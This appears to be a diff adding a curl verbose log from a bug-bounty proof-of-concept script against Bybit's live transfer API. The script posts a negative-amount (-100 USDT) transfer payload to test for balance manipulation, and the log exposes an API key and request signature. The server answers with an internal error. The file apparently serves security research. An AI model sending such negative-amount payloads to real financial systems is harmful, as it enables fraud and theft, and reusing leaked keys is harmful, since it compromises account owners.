@@ -1,0 +1,102 @@
+/media/sf_vremen/hackerone/Bybit Fintech Ltd/poc_10016.sh: line 9: UID: readonly variable
+--- REQUEST ---
+POST /v5/asset/transfer/inter-transfer
+Payload: {"transferId":"3473fd02-bdeb-4104-a74e-528d5e19ad22","coin":"USDT","amount":"-100","fromMemberId":1000,"toMemberId":1000}
+Timestamp: 1764002409000
+
+--- RESPONSE ---
+Note: Unnecessary use of -X or --request, POST is already inferred.
+  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
+                                 Dload  Upload   Total   Spent    Left  Speed
+  0     0    0     0    0     0      0      0 --:--:-- --:--:-- --:--:--     0* Host api.bybit.com:443 was resolved.
+* IPv6: (none)
+* IPv4: 52.222.236.109, 52.222.236.61, 52.222.236.24, 52.222.236.66
+  0     0    0     0    0     0      0      0 --:--:-- --:--:-- --:--:--     0*   Trying 52.222.236.109:443...
+* Connected to api.bybit.com (52.222.236.109) port 443
+* ALPN: curl offers h2,http/1.1
+} [5 bytes data]
+* TLSv1.3 (OUT), TLS handshake, Client hello (1):
+} [512 bytes data]
+*  CAfile: /etc/ssl/certs/ca-certificates.crt
+*  CApath: /etc/ssl/certs
+{ [5 bytes data]
+* TLSv1.3 (IN), TLS handshake, Server hello (2):
+{ [122 bytes data]
+* TLSv1.3 (IN), TLS handshake, Encrypted Extensions (8):
+{ [19 bytes data]
+* TLSv1.3 (IN), TLS handshake, Certificate (11):
+{ [3798 bytes data]
+* TLSv1.3 (IN), TLS handshake, CERT verify (15):
+{ [264 bytes data]
+* TLSv1.3 (IN), TLS handshake, Finished (20):
+{ [36 bytes data]
+* TLSv1.3 (OUT), TLS change cipher, Change cipher spec (1):
+} [1 bytes data]
+* TLSv1.3 (OUT), TLS handshake, Finished (20):
+} [36 bytes data]
+* SSL connection using TLSv1.3 / TLS_AES_128_GCM_SHA256 / X25519 / RSASSA-PSS
+* ALPN: server accepted h2
+* Server certificate:
+*  subject: CN=*.bybit.com
+*  start date: Sep 11 00:00:00 2025 GMT
+*  expire date: Oct  9 23:59:59 2026 GMT
+*  subjectAltName: host "api.bybit.com" matched cert's "*.bybit.com"
+*  issuer: C=US; O=Amazon; CN=Amazon RSA 2048 M01
+*  SSL certificate verify ok.
+*   Certificate level 0: Public key type RSA (2048/112 Bits/secBits), signed using sha256WithRSAEncryption
+*   Certificate level 1: Public key type RSA (2048/112 Bits/secBits), signed using sha256WithRSAEncryption
+*   Certificate level 2: Public key type RSA (2048/112 Bits/secBits), signed using sha256WithRSAEncryption
+} [5 bytes data]
+* using HTTP/2
+  0     0    0     0    0     0      0      0 --:--:--  0:00:01 --:--:--     0* [HTTP/2] [1] OPENED stream for https://api.bybit.com/v5/asset/transfer/inter-transfer
+* [HTTP/2] [1] [:method: POST]
+* [HTTP/2] [1] [:scheme: https]
+* [HTTP/2] [1] [:authority: api.bybit.com]
+* [HTTP/2] [1] [:path: /v5/asset/transfer/inter-transfer]
+* [HTTP/2] [1] [user-agent: curl/8.5.0]
+* [HTTP/2] [1] [accept: */*]
+* [HTTP/2] [1] [x-bapi-api-key: 22JSr5zWpW0eReC6rE]
+* [HTTP/2] [1] [x-bapi-sign: b7d591e409bd6e85aad062676fdf8ecf9a7deec1943f9b3dbe44093808e820d7]
+* [HTTP/2] [1] [x-bapi-sign-type: 2]
+* [HTTP/2] [1] [x-bapi-timestamp: 1764002409000]
+* [HTTP/2] [1] [x-bapi-recv-window: 5000]
+* [HTTP/2] [1] [content-type: application/json]
+* [HTTP/2] [1] [content-length: 121]
+} [5 bytes data]
+> POST /v5/asset/transfer/inter-transfer HTTP/2
+> Host: api.bybit.com
+> User-Agent: curl/8.5.0
+> Accept: */*
+> X-BAPI-API-KEY: 22JSr5zWpW0eReC6rE
+> X-BAPI-SIGN: b7d591e409bd6e85aad062676fdf8ecf9a7deec1943f9b3dbe44093808e820d7
+> X-BAPI-SIGN-TYPE: 2
+> X-BAPI-TIMESTAMP: 1764002409000
+> X-BAPI-RECV-WINDOW: 5000
+> Content-Type: application/json
+> Content-Length: 121
+> 
+} [121 bytes data]
+* TLSv1.3 (IN), TLS handshake, Newsession Ticket (4):
+{ [157 bytes data]
+< HTTP/2 200 
+< content-type: application/json; charset=utf-8
+< content-length: 100
+< date: Mon, 24 Nov 2025 16:40:12 GMT
+< x-bapi-limit: 60
+< x-bapi-limit-status: 59
+< x-bapi-limit-reset-timestamp: 1764002412123
+< ret_code: 10016
+< cache-control: no-store
+< traceid: 71d038a95c5c953d3441c0c1fcb80e17
+< timenow: 1764002412124
+< server: Openresty
+< x-cld-src: Loc-A
+< x-cache: Miss from cloudfront
+< via: 1.1 88f858f045c3909fad9cebbada511aee.cloudfront.net (CloudFront)
+< x-amz-cf-pop: FRA56-P4
+< x-amz-cf-id: pomxCdSs-oPeZI5zp3D0LDPQ9K0JUIkuBCR8f9Tx1HBBE3uUu5plNg==
+< 
+{ [100 bytes data]
+100   221  100   100  100   121     38     46  0:00:02  0:00:02 --:--:--    84100   221  100   100  100   121     38     46  0:00:02  0:00:02 --:--:--    84
+* Connection #0 to host api.bybit.com left intact
+{"retCode":10016,"retMsg":"Internal System Error.","result":{},"retExtInfo":{},"time":1764002412124}
